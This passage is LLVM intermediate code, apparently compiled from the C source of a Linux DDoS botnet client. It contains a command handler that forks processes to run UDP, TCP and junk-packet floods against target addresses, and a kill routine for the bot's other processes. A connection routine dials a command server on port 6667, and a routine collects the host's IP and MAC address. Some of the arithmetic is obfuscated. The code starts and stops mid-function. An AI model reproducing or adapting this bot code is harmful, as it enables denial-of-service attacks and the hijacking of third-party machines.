  %171 = icmp slt i32 %170, 4
  br i1 %171, label %184, label %172

; <label>:172:                                    ; preds = %169
  %173 = load i8**, i8*** %4, align 8
  %174 = getelementptr inbounds i8*, i8** %173, i64 2
  %175 = load i8*, i8** %174, align 8
  %176 = call i32 @atoi(i8* %175) #10
  %177 = icmp slt i32 %176, 1
  br i1 %177, label %184, label %178

; <label>:178:                                    ; preds = %172
  %179 = load i8**, i8*** %4, align 8
  %180 = getelementptr inbounds i8*, i8** %179, i64 3
  %181 = load i8*, i8** %180, align 8
  %182 = call i32 @atoi(i8* %181) #10
  %183 = icmp slt i32 %182, 1
  br i1 %183, label %184, label %185

; <label>:184:                                    ; preds = %178, %172, %169
  br label %528

; <label>:185:                                    ; preds = %178
  %186 = load i8**, i8*** %4, align 8
  %187 = getelementptr inbounds i8*, i8** %186, i64 1
  %188 = load i8*, i8** %187, align 8
  store i8* %188, i8** %11, align 8
  %189 = load i8**, i8*** %4, align 8
  %190 = getelementptr inbounds i8*, i8** %189, i64 2
  %191 = load i8*, i8** %190, align 8
  %192 = call i32 @atoi(i8* %191) #10
  store i32 %192, i32* %12, align 4
  %193 = load i8**, i8*** %4, align 8
  %194 = getelementptr inbounds i8*, i8** %193, i64 3
  %195 = load i8*, i8** %194, align 8
  %196 = call i32 @atoi(i8* %195) #10
  store i32 %196, i32* %13, align 4
  %197 = load i8*, i8** %11, align 8
  %198 = call i8* @strstr(i8* %197, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %199 = icmp ne i8* %198, null
  br i1 %199, label %200, label %218

; <label>:200:                                    ; preds = %185
  %201 = load i8*, i8** %11, align 8
  %202 = call i8* @strtok(i8* %201, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %202, i8** %14, align 8
  br label %203

; <label>:203:                                    ; preds = %215, %200
  %204 = load i8*, i8** %14, align 8
  %205 = icmp ne i8* %204, null
  br i1 %205, label %206, label %217

; <label>:206:                                    ; preds = %203
  %207 = call i32 @listFork()
  %208 = icmp ne i32 %207, 0
  br i1 %208, label %215, label %209

; <label>:209:                                    ; preds = %206
  %210 = load i8*, i8** %14, align 8
  %211 = load i32, i32* %12, align 4
  %212 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %210, i32 %211, i32 %212)
  %213 = load i32, i32* @mainCommSock, align 4
  %214 = call i32 @close(i32 %213)
  call void @_exit(i32 0) #12
  unreachable

; <label>:215:                                    ; preds = %206
  %216 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %216, i8** %14, align 8
  br label %203

; <label>:217:                                    ; preds = %203
  br label %226

; <label>:218:                                    ; preds = %185
  %219 = call i32 @listFork()
  %220 = icmp ne i32 %219, 0
  br i1 %220, label %221, label %222

; <label>:221:                                    ; preds = %218
  br label %528

; <label>:222:                                    ; preds = %218
  %223 = load i8*, i8** %11, align 8
  %224 = load i32, i32* %12, align 4
  %225 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %223, i32 %224, i32 %225)
  call void @_exit(i32 0) #12
  unreachable

; <label>:226:                                    ; preds = %217
  br label %227

; <label>:227:                                    ; preds = %226, %163
  %228 = load i8**, i8*** %4, align 8
  %229 = getelementptr inbounds i8*, i8** %228, i64 0
  %230 = load i8*, i8** %229, align 8
  %231 = call i32 @strcmp(i8* %230, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0)) #10
  %232 = icmp ne i32 %231, 0
  br i1 %232, label %346, label %233

; <label>:233:                                    ; preds = %227
  %234 = load i32, i32* %3, align 4
  %235 = icmp slt i32 %234, 6
  br i1 %235, label %281, label %236

; <label>:236:                                    ; preds = %233
  %237 = load i8**, i8*** %4, align 8
  %238 = getelementptr inbounds i8*, i8** %237, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = call i32 @atoi(i8* %239) #10
  %241 = icmp eq i32 %240, -1
  br i1 %241, label %281, label %242

; <label>:242:                                    ; preds = %236
  %243 = load i8**, i8*** %4, align 8
  %244 = getelementptr inbounds i8*, i8** %243, i64 2
  %245 = load i8*, i8** %244, align 8
  %246 = call i32 @atoi(i8* %245) #10
  %247 = icmp eq i32 %246, -1
  br i1 %247, label %281, label %248

; <label>:248:                                    ; preds = %242
  %249 = load i8**, i8*** %4, align 8
  %250 = getelementptr inbounds i8*, i8** %249, i64 4
  %251 = load i8*, i8** %250, align 8
  %252 = call i32 @atoi(i8* %251) #10
  %253 = icmp eq i32 %252, -1
  br i1 %253, label %281, label %254

; <label>:254:                                    ; preds = %248
  %255 = load i8**, i8*** %4, align 8
  %256 = getelementptr inbounds i8*, i8** %255, i64 5
  %257 = load i8*, i8** %256, align 8
  %258 = call i32 @atoi(i8* %257) #10
  %259 = icmp eq i32 %258, -1
  br i1 %259, label %281, label %260

; <label>:260:                                    ; preds = %254
  %261 = load i8**, i8*** %4, align 8
  %262 = getelementptr inbounds i8*, i8** %261, i64 5
  %263 = load i8*, i8** %262, align 8
  %264 = call i32 @atoi(i8* %263) #10
  %265 = icmp sgt i32 %264, 65500
  br i1 %265, label %281, label %266

; <label>:266:                                    ; preds = %260
  %267 = load i8**, i8*** %4, align 8
  %268 = getelementptr inbounds i8*, i8** %267, i64 4
  %269 = load i8*, i8** %268, align 8
  %270 = call i32 @atoi(i8* %269) #10
  %271 = icmp sgt i32 %270, 32
  br i1 %271, label %281, label %272

; <label>:272:                                    ; preds = %266
  %273 = load i32, i32* %3, align 4
  %274 = icmp eq i32 %273, 7
  br i1 %274, label %275, label %282

; <label>:275:                                    ; preds = %272
  %276 = load i8**, i8*** %4, align 8
  %277 = getelementptr inbounds i8*, i8** %276, i64 6
  %278 = load i8*, i8** %277, align 8
  %279 = call i32 @atoi(i8* %278) #10
  %280 = icmp slt i32 %279, 1
  br i1 %280, label %281, label %282

; <label>:281:                                    ; preds = %275, %266, %260, %254, %248, %242, %236, %233
  br label %528

; <label>:282:                                    ; preds = %275, %272
  %283 = load i8**, i8*** %4, align 8
  %284 = getelementptr inbounds i8*, i8** %283, i64 1
  %285 = load i8*, i8** %284, align 8
  store i8* %285, i8** %15, align 8
  %286 = load i8**, i8*** %4, align 8
  %287 = getelementptr inbounds i8*, i8** %286, i64 2
  %288 = load i8*, i8** %287, align 8
  %289 = call i32 @atoi(i8* %288) #10
  store i32 %289, i32* %16, align 4
  %290 = load i8**, i8*** %4, align 8
  %291 = getelementptr inbounds i8*, i8** %290, i64 3
  %292 = load i8*, i8** %291, align 8
  %293 = call i32 @atoi(i8* %292) #10
  store i32 %293, i32* %17, align 4
  %294 = load i8**, i8*** %4, align 8
  %295 = getelementptr inbounds i8*, i8** %294, i64 4
  %296 = load i8*, i8** %295, align 8
  %297 = call i32 @atoi(i8* %296) #10
  store i32 %297, i32* %18, align 4
  %298 = load i8**, i8*** %4, align 8
  %299 = getelementptr inbounds i8*, i8** %298, i64 5
  %300 = load i8*, i8** %299, align 8
  %301 = call i32 @atoi(i8* %300) #10
  store i32 %301, i32* %19, align 4
  %302 = load i32, i32* %3, align 4
  %303 = icmp eq i32 %302, 7
  br i1 %303, label %304, label %309

; <label>:304:                                    ; preds = %282
  %305 = load i8**, i8*** %4, align 8
  %306 = getelementptr inbounds i8*, i8** %305, i64 6
  %307 = load i8*, i8** %306, align 8
  %308 = call i32 @atoi(i8* %307) #10
  br label %310

; <label>:309:                                    ; preds = %282
  br label %310

; <label>:310:                                    ; preds = %309, %304
  %311 = phi i32 [ %308, %304 ], [ 10, %309 ]
  store i32 %311, i32* %20, align 4
  %312 = load i8*, i8** %15, align 8
  %313 = call i8* @strstr(i8* %312, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %314 = icmp ne i8* %313, null
  br i1 %314, label %315, label %334

; <label>:315:                                    ; preds = %310
  %316 = load i8*, i8** %15, align 8
  %317 = call i8* @strtok(i8* %316, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %317, i8** %21, align 8
  br label %318

; <label>:318:                                    ; preds = %331, %315
  %319 = load i8*, i8** %21, align 8
  %320 = icmp ne i8* %319, null
  br i1 %320, label %321, label %333

; <label>:321:                                    ; preds = %318
  %322 = call i32 @listFork()
  %323 = icmp ne i32 %322, 0
  br i1 %323, label %331, label %324

; <label>:324:                                    ; preds = %321
  %325 = load i8*, i8** %21, align 8
  %326 = load i32, i32* %16, align 4
  %327 = load i32, i32* %17, align 4
  %328 = load i32, i32* %18, align 4
  %329 = load i32, i32* %19, align 4
  %330 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %325, i32 %326, i32 %327, i32 %328, i32 %329, i32 %330)
  call void @_exit(i32 0) #12
  unreachable

; <label>:331:                                    ; preds = %321
  %332 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %332, i8** %21, align 8
  br label %318

; <label>:333:                                    ; preds = %318
  br label %345

; <label>:334:                                    ; preds = %310
  %335 = call i32 @listFork()
  %336 = icmp ne i32 %335, 0
  br i1 %336, label %337, label %338

; <label>:337:                                    ; preds = %334
  br label %528

; <label>:338:                                    ; preds = %334
  %339 = load i8*, i8** %15, align 8
  %340 = load i32, i32* %16, align 4
  %341 = load i32, i32* %17, align 4
  %342 = load i32, i32* %18, align 4
  %343 = load i32, i32* %19, align 4
  %344 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %339, i32 %340, i32 %341, i32 %342, i32 %343, i32 %344)
  call void @_exit(i32 0) #12
  unreachable

; <label>:345:                                    ; preds = %333
  br label %346

; <label>:346:                                    ; preds = %345, %227
  %347 = load i8**, i8*** %4, align 8
  %348 = getelementptr inbounds i8*, i8** %347, i64 0
  %349 = load i8*, i8** %348, align 8
  %350 = call i32 @strcmp(i8* %349, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.55, i32 0, i32 0)) #10
  %351 = icmp ne i32 %350, 0
  br i1 %351, label %473, label %352

; <label>:352:                                    ; preds = %346
  %353 = load i32, i32* %3, align 4
  %354 = icmp slt i32 %353, 6
  br i1 %354, label %397, label %355

; <label>:355:                                    ; preds = %352
  %356 = load i8**, i8*** %4, align 8
  %357 = getelementptr inbounds i8*, i8** %356, i64 3
  %358 = load i8*, i8** %357, align 8
  %359 = call i32 @atoi(i8* %358) #10
  %360 = icmp eq i32 %359, -1
  br i1 %360, label %397, label %361

; <label>:361:                                    ; preds = %355
  %362 = load i8**, i8*** %4, align 8
  %363 = getelementptr inbounds i8*, i8** %362, i64 2
  %364 = load i8*, i8** %363, align 8
  %365 = call i32 @atoi(i8* %364) #10
  %366 = icmp eq i32 %365, -1
  br i1 %366, label %397, label %367

; <label>:367:                                    ; preds = %361
  %368 = load i8**, i8*** %4, align 8
  %369 = getelementptr inbounds i8*, i8** %368, i64 4
  %370 = load i8*, i8** %369, align 8
  %371 = call i32 @atoi(i8* %370) #10
  %372 = icmp eq i32 %371, -1
  br i1 %372, label %397, label %373

; <label>:373:                                    ; preds = %367
  %374 = load i8**, i8*** %4, align 8
  %375 = getelementptr inbounds i8*, i8** %374, i64 4
  %376 = load i8*, i8** %375, align 8
  %377 = call i32 @atoi(i8* %376) #10
  %378 = icmp sgt i32 %377, 32
  br i1 %378, label %397, label %379

; <label>:379:                                    ; preds = %373
  %380 = load i32, i32* %3, align 4
  %381 = icmp sgt i32 %380, 6
  br i1 %381, label %382, label %388

; <label>:382:                                    ; preds = %379
  %383 = load i8**, i8*** %4, align 8
  %384 = getelementptr inbounds i8*, i8** %383, i64 6
  %385 = load i8*, i8** %384, align 8
  %386 = call i32 @atoi(i8* %385) #10
  %387 = icmp slt i32 %386, 0
  br i1 %387, label %397, label %388

; <label>:388:                                    ; preds = %382, %379
  %389 = load i32, i32* %3, align 4
  %390 = icmp eq i32 %389, 8
  br i1 %390, label %391, label %398

; <label>:391:                                    ; preds = %388
  %392 = load i8**, i8*** %4, align 8
  %393 = getelementptr inbounds i8*, i8** %392, i64 7
  %394 = load i8*, i8** %393, align 8
  %395 = call i32 @atoi(i8* %394) #10
  %396 = icmp slt i32 %395, 1
  br i1 %396, label %397, label %398

; <label>:397:                                    ; preds = %391, %382, %373, %367, %361, %355, %352
  br label %528

; <label>:398:                                    ; preds = %391, %388
  %399 = load i8**, i8*** %4, align 8
  %400 = getelementptr inbounds i8*, i8** %399, i64 1
  %401 = load i8*, i8** %400, align 8
  store i8* %401, i8** %22, align 8
  %402 = load i8**, i8*** %4, align 8
  %403 = getelementptr inbounds i8*, i8** %402, i64 2
  %404 = load i8*, i8** %403, align 8
  %405 = call i32 @atoi(i8* %404) #10
  store i32 %405, i32* %23, align 4
  %406 = load i8**, i8*** %4, align 8
  %407 = getelementptr inbounds i8*, i8** %406, i64 3
  %408 = load i8*, i8** %407, align 8
  %409 = call i32 @atoi(i8* %408) #10
  store i32 %409, i32* %24, align 4
  %410 = load i8**, i8*** %4, align 8
  %411 = getelementptr inbounds i8*, i8** %410, i64 4
  %412 = load i8*, i8** %411, align 8
  %413 = call i32 @atoi(i8* %412) #10
  store i32 %413, i32* %25, align 4
  %414 = load i8**, i8*** %4, align 8
  %415 = getelementptr inbounds i8*, i8** %414, i64 5
  %416 = load i8*, i8** %415, align 8
  store i8* %416, i8** %26, align 8
  %417 = load i32, i32* %3, align 4
  %418 = icmp eq i32 %417, 8
  br i1 %418, label %419, label %424

; <label>:419:                                    ; preds = %398
  %420 = load i8**, i8*** %4, align 8
  %421 = getelementptr inbounds i8*, i8** %420, i64 7
  %422 = load i8*, i8** %421, align 8
  %423 = call i32 @atoi(i8* %422) #10
  br label %425

; <label>:424:                                    ; preds = %398
  br label %425

; <label>:425:                                    ; preds = %424, %419
  %426 = phi i32 [ %423, %419 ], [ 10, %424 ]
  store i32 %426, i32* %27, align 4
  %427 = load i32, i32* %3, align 4
  %428 = icmp sgt i32 %427, 6
  br i1 %428, label %429, label %434

; <label>:429:                                    ; preds = %425
  %430 = load i8**, i8*** %4, align 8
  %431 = getelementptr inbounds i8*, i8** %430, i64 6
  %432 = load i8*, i8** %431, align 8
  %433 = call i32 @atoi(i8* %432) #10
  br label %435

; <label>:434:                                    ; preds = %425
  br label %435

; <label>:435:                                    ; preds = %434, %429
  %436 = phi i32 [ %433, %429 ], [ 0, %434 ]
  store i32 %436, i32* %28, align 4
  %437 = load i8*, i8** %22, align 8
  %438 = call i8* @strstr(i8* %437, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #10
  %439 = icmp ne i8* %438, null
  br i1 %439, label %440, label %460

; <label>:440:                                    ; preds = %435
  %441 = load i8*, i8** %22, align 8
  %442 = call i8* @strtok(i8* %441, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %442, i8** %29, align 8
  br label %443

; <label>:443:                                    ; preds = %457, %440
  %444 = load i8*, i8** %29, align 8
  %445 = icmp ne i8* %444, null
  br i1 %445, label %446, label %459

; <label>:446:                                    ; preds = %443
  %447 = call i32 @listFork()
  %448 = icmp ne i32 %447, 0
  br i1 %448, label %457, label %449

; <label>:449:                                    ; preds = %446
  %450 = load i8*, i8** %29, align 8
  %451 = load i32, i32* %23, align 4
  %452 = load i32, i32* %24, align 4
  %453 = load i32, i32* %25, align 4
  %454 = load i8*, i8** %26, align 8
  %455 = load i32, i32* %28, align 4
  %456 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %450, i32 %451, i32 %452, i32 %453, i8* %454, i32 %455, i32 %456)
  call void @_exit(i32 0) #12
  unreachable

; <label>:457:                                    ; preds = %446
  %458 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.36, i32 0, i32 0)) #2
  store i8* %458, i8** %29, align 8
  br label %443

; <label>:459:                                    ; preds = %443
  br label %472

; <label>:460:                                    ; preds = %435
  %461 = call i32 @listFork()
  %462 = icmp ne i32 %461, 0
  br i1 %462, label %463, label %464

; <label>:463:                                    ; preds = %460
  br label %528

; <label>:464:                                    ; preds = %460
  %465 = load i8*, i8** %22, align 8
  %466 = load i32, i32* %23, align 4
  %467 = load i32, i32* %24, align 4
  %468 = load i32, i32* %25, align 4
  %469 = load i8*, i8** %26, align 8
  %470 = load i32, i32* %28, align 4
  %471 = load i32, i32* %27, align 4
  call void @sendTCP(i8* %465, i32 %466, i32 %467, i32 %468, i8* %469, i32 %470, i32 %471)
  call void @_exit(i32 0) #12
  unreachable

; <label>:472:                                    ; preds = %459
  br label %473

; <label>:473:                                    ; preds = %472, %346
  %474 = load i8**, i8*** %4, align 8
  %475 = getelementptr inbounds i8*, i8** %474, i64 0
  %476 = load i8*, i8** %475, align 8
  %477 = call i32 @strcmp(i8* %476, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)) #10
  %478 = icmp ne i32 %477, 0
  br i1 %478, label %521, label %479

; <label>:479:                                    ; preds = %473
  store i32 0, i32* %30, align 4
  store i64 0, i64* %31, align 8
  br label %480

; <label>:480:                                    ; preds = %509, %479
  %481 = load i64, i64* %31, align 8
  %482 = load i64, i64* @numpids, align 8
  %483 = icmp ult i64 %481, %482
  br i1 %483, label %484, label %515

; <label>:484:                                    ; preds = %480
  %485 = load i32*, i32** @pids, align 8
  %486 = load i64, i64* %31, align 8
  %487 = getelementptr inbounds i32, i32* %485, i64 %486
  %488 = load i32, i32* %487, align 4
  %489 = icmp ne i32 %488, 0
  br i1 %489, label %490, label %508

; <label>:490:                                    ; preds = %484
  %491 = load i32*, i32** @pids, align 8
  %492 = load i64, i64* %31, align 8
  %493 = getelementptr inbounds i32, i32* %491, i64 %492
  %494 = load i32, i32* %493, align 4
  %495 = call i32 @getpid() #2
  %496 = icmp ne i32 %494, %495
  br i1 %496, label %497, label %508

; <label>:497:                                    ; preds = %490
  %498 = load i32*, i32** @pids, align 8
  %499 = load i64, i64* %31, align 8
  %500 = getelementptr inbounds i32, i32* %498, i64 %499
  %501 = load i32, i32* %500, align 4
  %502 = call i32 @kill(i32 %501, i32 9) #2
  %503 = load i32, i32* %30, align 4
  %504 = add i32 %503, 110314518
  %505 = add i32 %504, 1
  %506 = sub i32 %505, 110314518
  %507 = add nsw i32 %503, 1
  store i32 %506, i32* %30, align 4
  br label %508

; <label>:508:                                    ; preds = %497, %490, %484
  br label %509

; <label>:509:                                    ; preds = %508
  %510 = load i64, i64* %31, align 8
  %511 = add i64 %510, 8715985295635354954
  %512 = add i64 %511, 1
  %513 = sub i64 %512, 8715985295635354954
  %514 = add i64 %510, 1
  store i64 %513, i64* %31, align 8
  br label %480

; <label>:515:                                    ; preds = %480
  %516 = load i32, i32* %30, align 4
  %517 = icmp sgt i32 %516, 0
  br i1 %517, label %518, label %519

; <label>:518:                                    ; preds = %515
  br label %520

; <label>:519:                                    ; preds = %515
  br label %520

; <label>:520:                                    ; preds = %519, %518
  br label %521

; <label>:521:                                    ; preds = %520, %473
  %522 = load i8**, i8*** %4, align 8
  %523 = getelementptr inbounds i8*, i8** %522, i64 0
  %524 = load i8*, i8** %523, align 8
  %525 = call i32 @strcmp(i8* %524, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0)) #10
  %526 = icmp ne i32 %525, 0
  br i1 %526, label %528, label %527

; <label>:527:                                    ; preds = %521
  call void @exit(i32 0) #14
  unreachable

; <label>:528:                                    ; preds = %521, %463, %397, %337, %281, %221, %184, %157, %122, %97, %92, %86, %72, %60, %46, %37
  ret void
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) #4

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

declare i32 @printf(i8*, ...) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [4096 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 4096, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = sub i32 0, %11
  %13 = sub i32 0, 1
  %14 = add i32 %12, %13
  %15 = sub i32 0, %14
  %16 = add nsw i32 %11, 1
  %17 = sext i32 %15 to i64
  %18 = icmp eq i64 %17, 1
  br i1 %18, label %19, label %20

; <label>:19:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %27

; <label>:20:                                     ; preds = %10
  %21 = load i32, i32* @currentServer, align 4
  %22 = sub i32 0, %21
  %23 = sub i32 0, 1
  %24 = add i32 %22, %23
  %25 = sub i32 0, %24
  %26 = add nsw i32 %21, 1
  store i32 %25, i32* @currentServer, align 4
  br label %27

; <label>:27:                                     ; preds = %20, %19
  %28 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %29 = load i32, i32* @currentServer, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %30
  %32 = load i8*, i8** %31, align 8
  %33 = call i8* @strcpy(i8* %28, i8* %32) #2
  store i32 6667, i32* %3, align 4
  %34 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %35 = call i8* @strchr(i8* %34, i32 58) #10
  %36 = icmp ne i8* %35, null
  br i1 %36, label %37, label %44

; <label>:37:                                     ; preds = %27
  %38 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %39 = call i8* @strchr(i8* %38, i32 58) #10
  %40 = getelementptr inbounds i8, i8* %39, i64 1
  %41 = call i32 @atoi(i8* %40) #10
  store i32 %41, i32* %3, align 4
  %42 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %43 = call i8* @strchr(i8* %42, i32 58) #10
  store i8 0, i8* %43, align 1
  br label %44

; <label>:44:                                     ; preds = %37, %27
  %45 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %45, i32* @mainCommSock, align 4
  %46 = load i32, i32* @mainCommSock, align 4
  %47 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i32 0, i32 0
  %48 = load i32, i32* %3, align 4
  %49 = call i32 @connectTimeout(i32 %46, i8* %47, i32 %48, i32 30)
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %44
  store i32 1, i32* %1, align 4
  br label %53

; <label>:52:                                     ; preds = %44
  store i32 0, i32* %1, align 4
  br label %53

; <label>:53:                                     ; preds = %52, %51
  %54 = load i32, i32* %1, align 4
  ret i32 %54
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %103

; <label>:16:                                     ; preds = %0
  %17 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %17, i8 0, i64 16, i32 4, i1 false)
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.58, i32 0, i32 0)) #2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %21 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i32 0, i32 0
  store i32 %19, i32* %21, align 4
  %22 = call zeroext i16 @htons(i16 zeroext 53) #13
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = load i32, i32* %2, align 4
  %25 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %26 = call i32 @connect(i32 %24, %struct.sockaddr* %25, i32 16)
  store i32 %26, i32* %4, align 4
  %27 = load i32, i32* %4, align 4
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %16
  store i32 0, i32* %1, align 4
  br label %103

; <label>:30:                                     ; preds = %16
  store i32 16, i32* %6, align 4
  %31 = load i32, i32* %2, align 4
  %32 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %33 = call i32 @getsockname(i32 %31, %struct.sockaddr* %32, i32* %6) #2
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %30
  store i32 0, i32* %1, align 4
  br label %103

; <label>:37:                                     ; preds = %30
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %39 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %38, i32 0, i32 0
  %40 = load i32, i32* %39, align 4
  store i32 %40, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %41 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.59, i32 0, i32 0), i32 0)
  store i32 %41, i32* %7, align 4
  br label %42

; <label>:42:                                     ; preds = %63, %37
  %43 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %44 = load i32, i32* %7, align 4
  %45 = call i8* @fdgets(i8* %43, i32 4096, i32 %44)
  %46 = icmp ne i8* %45, null
  br i1 %46, label %47, label %65

; <label>:47:                                     ; preds = %42
  %48 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %49 = call i8* @strstr(i8* %48, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0)) #10
  %50 = icmp ne i8* %49, null
  br i1 %50, label %51, label %63

; <label>:51:                                     ; preds = %47
  %52 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %52, i8** %9, align 8
  br label %53

; <label>:53:                                     ; preds = %58, %51
  %54 = load i8*, i8** %9, align 8
  %55 = load i8, i8* %54, align 1
  %56 = zext i8 %55 to i32
  %57 = icmp ne i32 %56, 9
  br i1 %57, label %58, label %61

; <label>:58:                                     ; preds = %53
  %59 = load i8*, i8** %9, align 8
  %60 = getelementptr inbounds i8, i8* %59, i32 1
  store i8* %60, i8** %9, align 8
  br label %53

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %9, align 8
  store i8 0, i8* %62, align 1
  br label %65

; <label>:63:                                     ; preds = %47
  %64 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %64, i8 0, i64 4096, i32 16, i1 false)
  br label %42

; <label>:65:                                     ; preds = %61, %42
  %66 = load i32, i32* %7, align 4
  %67 = call i32 @close(i32 %66)
  %68 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %69 = load i8, i8* %68, align 16
  %70 = icmp ne i8 %69, 0
  br i1 %70, label %71, label %100

; <label>:71:                                     ; preds = %65
  %72 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %73 = bitcast %union.anon.6* %72 to [16 x i8]*
  %74 = getelementptr inbounds [16 x i8], [16 x i8]* %73, i32 0, i32 0
  %75 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %76 = call i8* @strcpy(i8* %74, i8* %75) #2
  %77 = load i32, i32* %2, align 4
  %78 = call i32 (i32, i64, ...) @ioctl(i32 %77, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  br label %79

; <label>:79:                                     ; preds = %94, %71
  %80 = load i32, i32* %10, align 4
  %81 = icmp slt i32 %80, 6
  br i1 %81, label %82, label %99

; <label>:82:                                     ; preds = %79
  %83 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %84 = bitcast %union.anon.7* %83 to %struct.sockaddr*
  %85 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %84, i32 0, i32 1
  %86 = getelementptr inbounds [14 x i8], [14 x i8]* %85, i32 0, i32 0
  %87 = load i32, i32* %10, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = load i32, i32* %10, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %92
  store i8 %90, i8* %93, align 1
  br label %94

; <label>:94:                                     ; preds = %82
  %95 = load i32, i32* %10, align 4
